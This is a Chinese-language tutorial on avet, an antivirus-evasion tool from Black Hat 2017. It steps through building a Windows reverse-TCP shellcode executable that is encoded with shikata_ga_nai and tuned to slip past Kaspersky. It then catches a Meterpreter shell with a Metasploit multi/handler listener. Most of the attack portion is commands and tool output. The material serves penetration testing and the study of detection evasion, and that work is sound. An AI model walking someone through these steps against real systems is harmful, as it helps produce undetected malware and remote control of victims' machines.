# 【Blackhat】avet：杀软绕过工具使用教程

## 译文声明
本文为翻译文章，原文来源于安全客。译文仅供参考，具体内容及含义以原文为准。

作者：[lfty89](http://bobao.360.cn/member/contribute?uid=2905438952)  
预估稿费：300 RMB  
投稿方式：发送邮件至 linwei#360.cn 或登录网页版在线投稿

---

### 0x01 简介
**avet** 是一款在 GitHub 上的杀软绕过技术工具，同时也是 2017 年亚洲黑帽大会（3 月 28 日 - 7 月 31 日）和拉斯维加斯黑帽大会（7 月 22 日 - 7 月 27 日 PST）的 arsenal 工具之一。项目地址：[https://github.com/govolution/avet](https://github.com/govolution/avet)。

- 亚洲黑帽大会链接：[https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool](https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool)
- 拉斯维加斯黑帽大会链接：[https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet—antivirus-evasion-tool-7908](https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet---antivirus-evasion-tool-7908)

### 0x02 环境搭建
我们在 Kali Linux 中测试 avet。根据作者介绍，在使用 avet 之前，需要通过 Wine 安装 tdm-gcc。以下是安装步骤：

#### 下载 tdm-gcc
从 [SourceForge](https://nchc.dl.sourceforge.net/project/tdm-gcc/TDM-GCC%20Installer/tdm64-gcc-5.1.0-2.exe) 下载最新的 `tdm64-gcc-5.1.0-2.exe`，或者在 Kali 中使用 `wget` 命令：
```bash
wget -c --no-check-certificate https://nchc.dl.sourceforge.net/project/tdm-gcc/TDM-GCC%20Installer/tdm64-gcc-5.1.0-2.exe
```

#### 安装 tdm-gcc
```bash
wine tdm64-gcc-5.1.0-2.exe
```
弹出安装窗口后，选择 `create -> MinGW-w64/TDM64 (32-bit and 64-bit)`，默认安装路径为 `C:\TDM-GCC-64`，然后选择默认镜像及组件完成安装。

### 0x03 使用示例
#### 生成载荷
首先从 GitHub 上克隆 avet 项目：
```bash
git clone https://github.com/govolution/avet
```
进入 `build` 目录，可以看到各种类型的 payload。这里我们测试 `build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh` 脚本。编辑该脚本，将 `lhost` 设置为 Kali 的 IP 地址，`lport` 设置为监听端口。

回到上一级目录，注意从 GitHub 上下载的项目文件夹中默认包含编译好的 `make_avet` 和 `sh_format`。如果平台或架构不同，可能会出现报错。例如，作者发布的 `make_avet` 是 64 位的，而笔者的环境是 32 位 Kali，运行时会报错：
```bash
root@kali:~/Desktop# file make_avet 
make_avet: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9c06de9a25ab707db3ffc4882cebe862006c2d24, not stripped
```
因此，最好重新编译 `make_avet` 和 `sh_format`：
```bash
gcc -o make_avet make_avet.c
gcc -o sh_format sh_format.c
```

开始生成 payload：
```bash
./build/build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
```
输出示例：
```
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
x86/shikata_ga_nai succeeded with size 414 (iteration=2)
x86/shikata_ga_nai chosen with final size 414
Payload size: 414 bytes
Final size of c file: 1764 bytes
tr: warning: an unescaped backslash at end of string is not portable
 ________  ___      ___ _______  _________  
|   __  |      /  /|  ___ |___   ___ 
   |       /  / |    __/|___   _| 
     __     /  / /    _|/__       
             / /      _|       
    __ __ __/ /      _______   __
    |__||__||__|/       |_______|   |__|
Anti Virus Evasion Make Tool by Daniel Sauder
use -h for help
write shellcode from scclean.txt to defs.h
```
最终生成 `pwn.exe`。

#### 测试载荷
在 Kali 上运行 Metasploit，设置本地监听参数并开始监听：
```bash
msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.120
LHOST => 192.168.1.120
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > exploit -j
```
在一台 32 位 Windows 7 靶机上运行 `pwn.exe` 即可触发 payload。